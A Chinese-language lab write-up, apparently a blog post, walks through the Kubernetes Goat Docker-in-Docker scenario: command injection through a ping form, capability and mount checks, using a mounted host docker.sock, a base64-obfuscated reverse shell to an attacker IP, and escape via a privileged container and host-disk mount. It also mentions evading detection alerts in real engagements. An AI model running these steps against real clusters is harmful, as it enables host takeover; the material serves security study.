#  【云原生安全】容器环境DIND场景下的漏洞发现与利用  
 进击的HACK   2026-01-23 23:50  
  
### 0X00 前言  
  
靶场搭建就不过多描述了，不知道的可以看上一篇文章 在场景结束时,我们将理解并学习以下内容:  
1. 您将学习测试和利用容器 UNIX 套接字错误配置  
  
1. 能够利用容器并逃逸出Docker容器  
  
1. 了解管道和 CI/CD 构建系统中常见的错误配置   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapYG3QedQubXS4GoD7D9bXqfazRYQ07EuW98zcaZpicf6uuGwzpJGoj0w/640?wx_fmt=png&from=appmsg "")  
  
在开始之前，我们要了解一下目前该场景的一些状况：在2024年官方将该场景套接字进行了修改   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapUFYiauXsylwBDyOYBPp5r1TPZlNgd4LfAOC7qOdAsUwwQJxjeaLjSMw/640?wx_fmt=png&from=appmsg "")  
  
可以看到官方将/var/run/docker.sock  
修改为了/run/containerd/containerd.sock  
，在后面利用的时候我将此处进行了还原，但是映射后的容器中的套接字名称以及路径并没有改变，意思就是我是使用的宿主机的docker.sock套接字，但在容器中仍然为/run/containerd/containerd.sock  
，注意区分不要被误导!  
### 0X01 漏洞发现与利用  
  
访问漏洞环境地址: http://IP:1231/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapFsyOIZBpdWh0icg7KCrJfnPtfVfMkbZREA8o2YjlrVpbcnHHIKopiclQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞探测，发现为典型的ping漏洞，在pikachu靶场也有这个场景漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapVvEOqvfh23QicYJnnP89Rty58hEkdZRP1b1OZzdSeRS47X6vRmsibVYg/640?wx_fmt=png&from=appmsg "")  
  
尝试绕过  
```
127.0.0.1 && curl www.baidu.com
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapqzDZCoEBOPRxianUamMXy4TMTRiaddwLsZIFzJiaLzUJBSDcJVZ9ETHmA/640?wx_fmt=png&from=appmsg "")  
  
发现利用成功，但是这样输出的太多垃圾数据了，尝试一下有没有其他的利用方式  
```
;id
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapKKeicZWGPuLB4X8wFQ0aRHOkicbPHGrAyJ6BE1tyoUCk8FZicjxibEgjZg/640?wx_fmt=png&from=appmsg "")  
  
发现可以截断执行命令(常规手法)，接下来就探测内网的环境容器  
```
;env
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9Vciap1RXMb2JjKe5jNv6WBbzAWe9QHYasLu4nicemOibqRp0stezdMDNAgsOQ/640?wx_fmt=png&from=appmsg "")  
  
存在kubernete环境，探测容器权限  
```
;fdisk -l
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapOkjtrn2ZKWHbM7C44xldMCQcgxRfHnnjMX7TLibnvicGJia4PjH8u0z5g/640?wx_fmt=png&from=appmsg "")  
  
执行该命令后发现返回报错信息，尝试其他命令探测，执行以下命令  
```
;cat /proc/self/status | grep CapEff
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapVVicSkJIID2EozFmhzxJGdK6KOCMb2uuukicUiceA7SjFZFpzSd4HicYUw/640?wx_fmt=png&from=appmsg "")  
  
返回结果为CapEff: 000001ffffffffff  
判断为高权限容器环境，尝试下一步利用查看挂载情况，执行命令  
```
;mount
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciaptuLaps0sFqFfv8sklBaGI7icBTZRibicTrkuLBSdIGo5MycMoxibxU4P9g/640?wx_fmt=png&from=appmsg "")  
  
发现存在套接字并且为containerd  
，也是本篇所要使用到的利用思路，但是在前言中提到，我们将deployment.yaml  
文件进行了修改，所以暂时不对运行时套接字展开利用  
#### 0X02 DIND配置错误漏洞发现  
  
修改/kubernetes-goat/scenarios/health-checkdeployment.yaml  
文件  
```
apiVersion: apps/v1kind:Deploymentmetadata:name:health-check-deploymentspec:selector:    matchLabels:      app:health-checktemplate:    metadata:      labels:        app:health-check    spec:      containers:      -name:health-check        image:madhuakula/k8s-goat-health-check        resources:          limits:            memory:"100Mi"            cpu:"30m"        ports:        -containerPort:80      # Custom Stuff        securityContext:          privileged:true        volumeMounts:          -mountPath:/custom/containerd/containerd.sock            name:containerd-sock-volume      volumes:        -name:containerd-sock-volume          hostPath:            path:/run/docker.sock#/run/containerd/containerd.sock            type:Socket---apiVersion:v1kind:Servicemetadata:name:health-check-servicespec:ports:-protocol:TCP    port:80    targetPort:80selector:    app:health-check
```  
  
这里将运行时套接字修改为了docker.sock  
套接字 开启靶场环境  
```
bash setup-kubernetes-goat.sh
```  
  
等待镜像创建成功后，将端口服务暴露出来  
```
bash access-kubernetes-goat.sh
```  
  
访问地址：http://IP:1231/  
下载docker  
```
;wget https://download.docker.com/linux/static/stable/x86_64/docker-28.3.2.tgz -O /tmp/docker.tar.gz
```  
  
如果遇到执行下载命令后页面访问失败，可以执行下面的命令进入容器下载完成docker后再继续向下漏洞利用  
```
kubectl exec -it -n default $(kubectl get pod -l app=health-check -o name) -- /bin/bash
```  
  
  
下载完成后，解压tar包(注意: 这里已经回靶场Web界面了)  
```
;tar /tmp/docker.tar.gz /tmp/docker
```  
  
这里containerd.sock  
实际映射的是docker.sock  
，因为前面已经修改yaml文件，但是containerd.sock  
没有修改，看自己怎么修改了，也可以直接把containerd.sock  
修改为docker.sock  
路径。如果需要修改，可以修改为下面这个yaml内容。  
  
Eg：  
```
apiVersion: apps/v1kind:Deploymentmetadata:name:health-check-deploymentspec:selector:    matchLabels:      app:health-checktemplate:    metadata:      labels:        app:health-check    spec:      containers:      -name:health-check        image:madhuakula/k8s-goat-health-check        resources:          limits:            memory:"100Mi"            cpu:"30m"        ports:        -containerPort:80      # Custom Stuff        securityContext:          privileged:true        volumeMounts:          -mountPath:/custom/docker.sock #/custom/containerd/containerd.sock            name:containerd-sock-volume      volumes:        -name:containerd-sock-volume          hostPath:            path:/run/docker.sock #/run/containerd/containerd.sock            type:Socket---apiVersion:v1kind:Servicemetadata:name:health-check-servicespec:ports:-protocol:TCP    port:80    targetPort:80selector:    app:health-check
```  
  
如果用上面这个yaml，可以执行;mount | grep sock  
来确定是否修改成功，后面就可以使用命令列出镜像列表：  
```
;/tmp/docker/docker -H unix:///custom/docker.sock images
```  
  
这里我还是使用未修改的套接字(实际是映射的宿主机的docker.sock套接字，修改过上面的，下面的命令平替一下即可)  
```
;/tmp/docker/docker -H unix:///custom/containerd/containerd.sock images
```  
  
这里就运用到了本文的DIND机制，即在容器使用套接字就可以管理宿主机中的容器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapiaKq4nt1QzuAMiclricEOzwCicj3cq7yDWHZVsfHMGD1VKRIwqibXePGcow/640?wx_fmt=png&from=appmsg "")  
#### 0X03 利用DIND特权进行容器逃逸🎯  
  
可以逃逸的思路  
```
1. 寻找或创建特权容器挂载进行逃逸2. 尝试CVE历史漏洞进行逃逸3. 等等
```  
  
反弹shell到vps(方便后面命令执行) 攻击机进行监听  
```
nc -lvnp 8811
```  
  
漏洞页面执行反弹命令  
```
;echo "YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvSVAvODgxMSA8JjE" | base64 -d | bash
```  
  
可以看到成功接收到shell   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapjpBt9SBtWnuezibeJtzfUXibyXYFnTC9j6fFtagNnzvOlfm0brdXoNrQ/640?wx_fmt=png&from=appmsg "")  
```
 /tmp/docker/docker -H unix:///custom/containerd/containerd.sock images
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9Vciapiawal8eMWwsR2kxhudKxrzFqiaZlUQeibtJ7oI3cqyfBEo85JlVKKZ4MQ/640?wx_fmt=png&from=appmsg "")  
  
尝试创建特权容器(实战中这里需要斟酌一下，流量设备可能会具备创建  
异常  
特权容器的相关策略，可能会出发告警，要规避一下)  
```
/tmp/docker/docker -H unix:///custom/containerd/containerd.sock run -it --privileged ubuntu /bin/bash
```  
  
非交互式终端创建特权容器  
```
/tmp/docker/docker -H unix:///custom/containerd/containerd.sock run --privileged ubuntu /bin/bash
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciaplQlKrI1p9S1K6Zq8emiaZeEkFN2xZAqTROuYwQOaNOJ6eI74iaIWwgBQ/640?wx_fmt=png&from=appmsg "")  
  
也可以强制模拟TTY制造一个伪终端  
```
script -q -c "/tmp/docker/docker -H unix:///custom/containerd/containerd.sock run -it --privileged ubuntu /bin/bash" /dev/null
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapIz0y7usQzLwZFehX8yguWKvX5EsjMb6icSOR8k08jplkywpLZUWCMiaQ/640?wx_fmt=png&from=appmsg "")  
  
这里我直接用伪终端进行下一步操作，查看挂载：  
```
mount
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9VciapUX383Hr8lV3RG3MYuMGfLMicjK1Z1Y6h9qWIgtZVxoTySRKia7ee8tzQ/640?wx_fmt=png&from=appmsg "")  
  
 挂载自盘到mnt文件夹   
```
mount /dev/vda1 /mnt
```  
  
进入/mnt文件夹，分别cat两个passwd文件来证明逃逸是否成功  
```
cat /etc/passwd #容器下的passwd
```  
```
cat etc/passwd
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0MibanQLqRG6e3SaIia9U9Vciap32ZHZfeB8QLDibzd6pPicpux4DZXGM1Ex6xeU2ZAtycHhcibHKZcS4TEg/640?wx_fmt=png&from=appmsg "")  
  
成功逃逸，DIND漏洞场景利用到此结束了(后面可能会出一个运行时套接字的利用)  
  
集合更新记录  
> 【云原生安全】CI CD与Gitops中易产生的漏洞发现与利用  
  
> 朱厌安全，公众号：朱厌安全[【云原生安全】CI CD与Gitops中易产生的漏洞发现与利用](https://mp.weixin.qq.com/s/dBREAuNIwwLqtXqLVwrLiw)  
  
  
> 云原生安全】海外Kubernete靶场搭建  
  
> 朱厌安全，公众号：朱厌安全[【云原生安全】海外Kubernete靶场搭建](https://mp.weixin.qq.com/s/3jY1AmTCfMwocf6nD2iSzw)  
  
  
  
